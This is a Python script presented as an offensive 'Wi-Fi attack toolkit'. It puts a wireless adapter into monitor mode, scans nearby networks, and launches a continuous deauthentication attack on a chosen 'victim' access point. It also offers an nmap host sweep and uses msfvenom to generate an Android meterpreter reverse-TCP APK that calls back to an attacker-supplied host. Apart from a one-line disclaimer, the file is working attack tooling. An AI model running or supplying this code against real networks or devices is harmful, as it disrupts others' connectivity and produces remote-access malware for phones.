#!/usr/bin/env python3
# VivekXploit Ultimate Wi-Fi Attack Toolkit
# For educational and authorized penetration testing only.

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

# BANNER
print(r"""
__     ___           _    __  __      _       _ _    
 \ \   / (_)_   _____| | __\ \/ /_ __ | | ___ (_) |_  
  \ \ / /| \ \ / / _ \ |/ / \  /| '_ \| |/ _ \| | __| 
   \ V / | |\ V /  __/   <  /  \| |_) | | (_) | | |_  
    \_/  |_| \_/ \___|_|\_\/_/\_\ .__/|_|\___/|_|\__| 
                                |_|                  

              V i v e k X p l o i t - ULTIMATE
""")

print("\nCreated by Vivek Dhobale | LinkedIn: https://www.linkedin.com/in/vivek-dhobale-vr\n")

# Check if script is run as root
if os.geteuid() != 0:
    print("This script must be run as root. Try again with 'sudo'.")
    exit()

# Global Variables
active_wireless_networks = []

# Clean old csv logs
for file in os.listdir():
    if file.endswith(".csv"):
        backup_dir = "backup"
        os.makedirs(backup_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        shutil.move(file, f"{backup_dir}/{timestamp}-{file}")

# Check Wi-Fi interfaces
wifi_list = re.findall(r"wlan[0-9]+", subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
if not wifi_list:
    print("No Wi-Fi adapter found. Please connect a compatible adapter.")
    exit()

print("Available Wi-Fi interfaces:")
for idx, iface in enumerate(wifi_list):
    print(f"{idx}: {iface}")

while True:
    try:
        choice = int(input("Select interface: "))
        hacknic = wifi_list[choice]
        break
    except:
        print("Invalid choice.")

# Kill conflicting processes & start monitor mode
subprocess.run(["airmon-ng", "check", "kill"])
subprocess.run(["airmon-ng", "start", hacknic])

# Start airodump-ng to scan networks
dump_proc = subprocess.Popen(["airodump-ng", "-w", "scan", "--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        time.sleep(3)
        for file in os.listdir():
            if file.endswith(".csv"):
                with open(file) as f:
                    csv_reader = csv.DictReader(f, fieldnames=[
                        'BSSID','First_time_seen','Last_time_seen','channel','Speed','Privacy',
                        'Cipher','Authentication','Power','beacons','IV','LAN_IP','ID_length','ESSID','Key'])
                    for row in csv_reader:
                        if row['BSSID'] in ('BSSID', 'Station MAC') or not row['ESSID'].strip():
                            continue
                        if row['ESSID'] not in [x['ESSID'] for x in active_wireless_networks]:
                            active_wireless_networks.append(row)
        os.system("clear")
        print("Detected Networks:")
        for i, ap in enumerate(active_wireless_networks):
            print(f"{i}. {ap['ESSID']} | BSSID: {ap['BSSID']} | Ch: {ap['channel'].strip()}")
except KeyboardInterrupt:
    pass

# Choose target network
while True:
    try:
        target = int(input("Choose network to attack: "))
        victim = active_wireless_networks[target]
        break
    except:
        print("Invalid choice.")

# Set channel & start deauth
subprocess.run(["airmon-ng", "start", hacknic + "mon", victim['channel'].strip()])
print(f"Launching deauth attack on {victim['ESSID']}...")
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", victim['BSSID'], hacknic + "mon"])

# ========== NEW FEATURE 1: NMAP NETWORK SCAN =============
def scan_network():
    print("\n[+] Running Nmap scan on local network...")
    local_ip = subprocess.run(["hostname", "-I"], capture_output=True).stdout.decode().split()[0]
    subnet = local_ip.rsplit('.', 1)[0] + ".0/24"
    subprocess.run(["nmap", "-sn", subnet])

# ========== NEW FEATURE 2: METASPLOIT PAYLOAD GEN =============
def generate_payload():
    print("\n[+] Generating Android reverse TCP payload...")
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT (e.g. 4444): ")
    out_file = "vivek_payload.apk"
    subprocess.run([
        "msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", out_file
    ])
    print(f"Payload saved as {out_file}")

# Ask user to run extra tools
while True:
    extra = input("\nDo you want to run extra tools? (1) Nmap Scan (2) Generate Payload (3) Exit: ")
    if extra == '1':
        scan_network()
    elif extra == '2':
        generate_payload()
    else:
        break

print("\n[*] Script complete. Stay legal and ethical. - VivekXploit")
